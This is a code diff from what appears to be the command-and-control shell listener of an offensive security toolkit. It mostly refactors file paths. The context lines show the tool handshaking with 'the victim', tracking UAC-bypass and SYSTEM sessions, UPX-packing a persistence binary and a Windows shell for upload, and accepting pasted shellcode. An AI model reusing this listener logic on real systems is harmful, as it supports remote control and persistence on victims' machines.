@@ -10,22 +10,17 @@ import select
 import base64
 import datetime
 import subprocess
-
-definepath = os.getcwd()
-# need this in case we are in src/program_junk/web_clone
-match = re.search("program_junk", definepath)
-if match:
-    os.chdir("../../../")
-    definepath = os.getcwd()
-
-sys.path.append(definepath)
+import binascii
 from src.core.setcore import *
 
+definepath = os.getcwd()
+sys.path.append(definepath)
+
 # cleanup
-if os.path.isfile("src/program_junk/uac.address"):
-    os.remove("src/program_junk/uac.address")
-if os.path.isfile("src/program_junk/system.address"):
-    os.remove("src/program_junk/system.address")
+if os.path.isfile(setdir + "/uac.address"):
+    os.remove(setdir + "/uac.address")
+if os.path.isfile(setdir + "/system.address"):
+    os.remove(setdir + "/system.address")
 
 # will remove this later
 core_modules = True
@@ -270,15 +265,12 @@ def start_listener():
 
             # if we are leveraging encryption
             if encryption == 1:
-
                 # generate a random 52 character string
                 random_string = os.urandom(52)
                 data=conn.send(random_string)
                 # confirm that we support encryption
                 data = conn.recv(1024)
                 if data == random_string:
-                    # import binascii for hex
-                    import binascii
                     # This method isn't probably the most desirable since it can
                     # be intercepted and unhex'd during transmission. Provides a
                     # good level of encryption unless the ciphertext is used as the
@@ -290,7 +282,8 @@ def start_listener():
                     conn.send(secret_send)
 
                 # if we didn't receive the confirmation back then we don't support encryption
-                else :  encryption = 0
+   
+                else : encryption = 0
 
             # if we aren't using encryption then tell the victim
             if encryption == 0:
@@ -822,9 +815,9 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                     time.sleep(0.5)
 
                     # write out system
-                    if os.path.isfile("src/program_junk/system.address"):
-                        os.remove("src/program_junk/system.address")
-                    filewrite = file("src/program_junk/system.address", "w")
+                    if os.path.isfile("%s/system.address" % (setdir)):
+                        os.remove("%s/system.address" % (setdir))
+                    filewrite = file("%s/system.address" % (setdir), "w")
                     filewrite.write(addr)
                     filewrite.close()
 
@@ -841,9 +834,9 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
 
                     # had to do some funky stuff here because global vars are not working properly
                     # inside threads, so the information cant be passed to normal outside routines
-                    if os.path.isfile("src/program_junk/uac.address"):
-                        os.remove("src/program_junk/uac.address")
-                    filewrite = file("src/program_junk/uac.address", "w")
+                    if os.path.isfile(setdir + "/uac.address"):
+                        os.remove(setdir + "/uac.address")
+                    filewrite = file(setdir + "/uac.address", "w")
                     filewrite.write(addr)
                     filewrite.close()
 
@@ -984,9 +977,9 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
 
                         if os.path.isfile("src/payloads/set_payloads/persistence.binary"):
                             if core_modules == True:
-                                subprocess.Popen("cp src/payloads/set_payloads/persistence.binary src/program_junk/", shell=True).wait()
-                                upx("src/program_junk/persistence.binary")
-                                upload = "src/program_junk/persistence.binary"
+                                subprocess.Popen("cp src/payloads/set_payloads/persistence.binary %s" % (setdir), shell=True).wait()
+                                upx("%s/persistence.binary" % (setdir))
+                                upload = "%s/persistence.binary" % (setdir)
                             if core_modules == False:
                                 upload = "src/payloads/set_payloads/persistence.binary"
 
@@ -1033,9 +1026,9 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
 
                         if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                             if core_modules == True:
-                                subprocess.Popen("cp src/payloads/set_payloads/shell.windows src/program_junk/", shell=True).wait()
-                                upx("src/program_junk/shell.windows")
-                                upload = "src/program_junk/shell.windows"
+                                subprocess.Popen("cp src/payloads/set_payloads/shell.windows %s" % (setdir), shell=True).wait()
+                                upx(setdir + "/shell.windows")
+                                upload = setdir + "/shell.windows"
                             if core_modules == False:
                                 upload = "src/payloads/set_payloads/shell.windows"
 
@@ -1377,8 +1370,8 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                 # if we have a windows shell
                 if data == "IHAYYYYYIAMSETANDIAMWINDOWS":
 
-                    if os.path.isfile("src/program_junk/system.address"):
-                        fileopen = file("src/program_junk/system.address", "r")
+                    if os.path.isfile(setdir + "/system.address"):
+                        fileopen = file(setdir + "/system.address", "r")
                         system = fileopen.read().rstrip()
                         system = system.replace(":WINDOWS", "")
                         system = system.replace(":UAC-SAFE", "")
@@ -1386,8 +1379,8 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
                             temp_addr = str(addr[0] + ":WINDOWS:SYSTEM")
                             bypass_counter = 1
 
-                    if os.path.isfile("src/program_junk/uac.address"):
-                        fileopen = file("src/program_junk/uac.address", "r")
+                    if os.path.isfile(setdir + "/uac.address"):
+                        fileopen = file(setdir + "/uac.address", "r")
                         uac = fileopen.read().rstrip()
                         uac = uac.replace(":WINDOWS", "")
                         if str(addr[0]) == str(uac):
@@ -1419,12 +1412,12 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
 
             # reset value
             # if uac != None:
-            if os.path.isfile("src/program_junk/uac.address"):
-                os.remove("src/program_junk/uac.address")
+            if os.path.isfile(setdir + "/uac.address"):
+                os.remove(setdir + "/uac.address")
                 bypass_counter = 0
 
-            if os.path.isfile("src/program_junk/system.address"):
-                os.remove("src/program_junk/system.address")
+            if os.path.isfile(setdir + "/system.address"):
+                os.remove(setdir + "/system.address")
                 bypass_counter = 0
 
             if addr[0] != "127.0.0.1":
@@ -1478,5 +1471,5 @@ Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
         sys.exit()
 
 # if we are calling from cli
-if __name__ == '__main__':
-    start_listener()
+#if __name__ == '__main__':
+start_listener()
